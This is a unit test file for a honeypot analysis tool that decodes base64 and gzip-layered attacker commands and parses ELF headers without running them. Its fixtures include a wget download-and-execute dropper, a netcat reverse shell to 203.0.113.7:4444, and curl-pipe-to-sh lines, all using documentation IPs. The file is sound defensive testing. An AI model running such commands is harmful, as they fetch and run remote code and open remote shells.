# SPDX-License-Identifier: GPL-2.0-or-later
# Copyright (C) 2026 The LanPulse authors
"""Decoding hidden content and reading the structure of Linux programs. Nothing here runs captured data."""
import base64
import gzip
import pathlib
import random
import struct
import sys
import tempfile
import types
import unittest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))

import honeyanalysis as ha
import staticlook

HIDDEN = b"#!/bin/sh\nwget http://203.0.113.50/x -O /tmp/x; chmod +x /tmp/x; /tmp/x\n"
with open(sys.executable, "rb") as _f:
    PYTHON = _f.read()


def b64(data: bytes) -> str:
    return base64.b64encode(data).decode()


class Decode(unittest.TestCase):
    def test_base64_gzip_and_nested_layers(self):
        inner = "echo %s | base64 -d | sh\n" % b64(b"nc 203.0.113.7 4444 -e /bin/sh  # second layer\n")
        text = "\n".join(["echo %s | base64 -d | sh" % b64(HIDDEN),
                          "echo %s | base64 -d | gunzip | sh" % b64(gzip.compress(b"curl http://198.51.100.9/a.sh | sh\n" * 3)),
                          "echo %s | base64 -d | sh" % b64(inner.encode())])
        found = staticlook.decode_blobs(text)
        self.assertEqual([(b["how"], b["line"]) for b in found],
                         [("base64", 1), ("base64 > gzip", 2), ("base64", 3), ("base64 > base64", 1)])
        self.assertEqual(found[0]["data"], HIDDEN)
        self.assertTrue(found[1]["data"].startswith(b"curl http://198.51.100.9"))
        self.assertIn(b"second layer", found[3]["data"])

    def test_hashes_keys_and_plain_text_are_not_mistaken_for_hidden_content(self):
        text = ("sha256 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\n"
                "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7vbqajDhA2x9mYcZ8Lr0s1pQwErTyUiOpAsDfGhJkLzXcVbNm root@x\n"
                "cd /tmp && wget http://203.0.113.50/bins/arm7 -O .x && chmod +x .x\n")
        self.assertEqual(staticlook.decode_blobs(text), [])

    def test_a_program_echoed_in_pieces_is_put_back_together(self):
        elf = PYTHON[:600] if PYTHON[:4] == b"\x7fELF" else b"\x7fELF" + bytes(range(200)) * 3
        cmds = "\n".join("echo -ne '%s' >> /tmp/.x" % "".join("\\x%02x" % c for c in elf[i:i + 60]) for i in range(0, len(elf), 60))
        found = staticlook.decode_blobs(cmds)
        self.assertEqual(len(found), 1)
        self.assertEqual(found[0]["data"], elf)
        self.assertIn("pieces joined", found[0]["how"])

    def test_output_is_bounded(self):
        many = "\n".join("echo " + b64(b"this is some readable hidden text %d" % i) for i in range(200))
        self.assertEqual(len(staticlook.decode_blobs(many)), staticlook.MAX_BLOBS)
        self.assertEqual(staticlook.decode_blobs("A" * 4_000_000), [])
        bomb = "echo " + b64(gzip.compress(b"A" * 30_000_000))
        self.assertLessEqual(len(staticlook.decode_blobs(bomb)[0]["data"]), staticlook.MAX_DECODED)


class Elf(unittest.TestCase):
    def test_not_a_program(self):
        for data in (b"", b"#!/bin/sh\n", b"\x7fELF", b"\x7fELF\x09\x01" + b"\0" * 80):
            self.assertIsNone(staticlook.elf_details(data))

    def test_minimal_32_bit_big_endian_header(self):
        hdr = b"\x7fELF\x01\x02\x01" + b"\0" * 9 + struct.pack(">HHIIIIIHHHHHH", 2, 8, 1, 0x400000, 0, 0, 0, 52, 32, 0, 40, 0, 0)
        r = staticlook.elf_details(hdr)
        self.assertEqual((r["bits"], r["type"], r["entry"], r["segments"], r["imports"]), (32, "executable", "0x400000", [], []))

    @unittest.skipUnless(PYTHON[:4] == b"\x7fELF", "needs an ELF Python to read")
    def test_reads_a_real_program_and_survives_damage(self):
        r = staticlook.elf_details(PYTHON)
        self.assertIn(r["bits"], (32, 64))
        self.assertTrue(r["segments"])
        self.assertTrue(any(s["perm"].endswith("x") for s in r["segments"]))
        self.assertTrue(all(n.isascii() and n.isprintable() for n in r["imports"] + r["needed"] + r["sections"]))
        self.assertLessEqual(len(r["imports"]), 300)
        self.assertEqual(staticlook.elf_details(PYTHON + b"X" * 5000)["overlay"], r["overlay"] + 5000)
        rnd = random.Random(7)
        for _ in range(400):                                    # cut short and corrupted headers must never raise
            b = bytearray(PYTHON[:rnd.choice([52, 64, 200, 1000, 5000, 60000])])
            for _ in range(rnd.randint(0, 12)):
                b[rnd.randrange(min(len(b), 1200))] = rnd.randrange(256)
            staticlook.elf_details(bytes(b))


class FakeHp:
    cfg = {}

    def _geo(self, ip):
        return {"iso": "", "country": "", "city": "", "org": "", "asn": None}

    def record(self, *a, **k):
        pass


class InTheViews(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        nm = types.SimpleNamespace(args=types.SimpleNamespace(demo=False), data_dir=pathlib.Path(self.tmp.name),
                                   notify_plain=lambda *a: None)
        self.h = ha.HoneyAnalysis(nm, FakeHp())

    def tearDown(self):
        self.tmp.cleanup()

    def test_script_and_session_show_decoded_content(self):
        script = ("#!/bin/sh\necho %s | base64 -d | sh\n" % b64(HIDDEN)).encode()
        ok, sha = self.h.add_sample(script, {"ip": "198.51.100.7"}, quiet=True)
        d = self.h.sample(sha)["decoded"]
        self.assertEqual(len(d), 1)
        self.assertEqual((d[0]["how"], d[0]["line"], d[0]["readable"]), ("base64", 2, True))
        self.assertIn("wget http://203.0.113.50/x", d[0]["text"])
        self.assertIn("download", d[0]["tags"])
        self.assertIn("hxxp://203[.]0[.]113[.]50/x", d[0]["iocs"])
        self.h.add_session({"session": "enc1", "ip": "198.51.100.7", "commands": ["uname -a", "echo %s|base64 -d|sh" % b64(HIDDEN)]}, quiet=True)
        s = self.h.session("enc1")["decoded"]
        self.assertEqual((len(s), s[0]["line"]), (1, 2))
        (pathlib.Path(self.tmp.name) / "honeypot-samples" / sha).unlink()
        self.assertNotIn("decoded", self.h.sample(sha))        # a missing file is not an error

    def test_program_gets_structure_and_binary_content_is_listed_as_hex(self):
        elf = b"\x7fELF\x01\x01\x01" + b"\0" * 9 + struct.pack("<HHIIIIIHHHHHH", 2, 40, 1, 0x8000, 0, 0, 0, 52, 32, 0, 40, 0, 0) + b"\0" * 64
        ok, sha = self.h.add_sample(elf, {}, quiet=True)
        self.assertEqual(self.h.sample(sha)["elf"]["bits"], 32)
        v = ha.decoded_view("echo %s | base64 -d > /tmp/x" % b64(elf))
        self.assertEqual((v[0]["readable"], v[0]["tags"]), (False, []))
        self.assertTrue(v[0]["text"].startswith("00000000  7f 45 4c 46"))


if __name__ == "__main__":
    unittest.main()
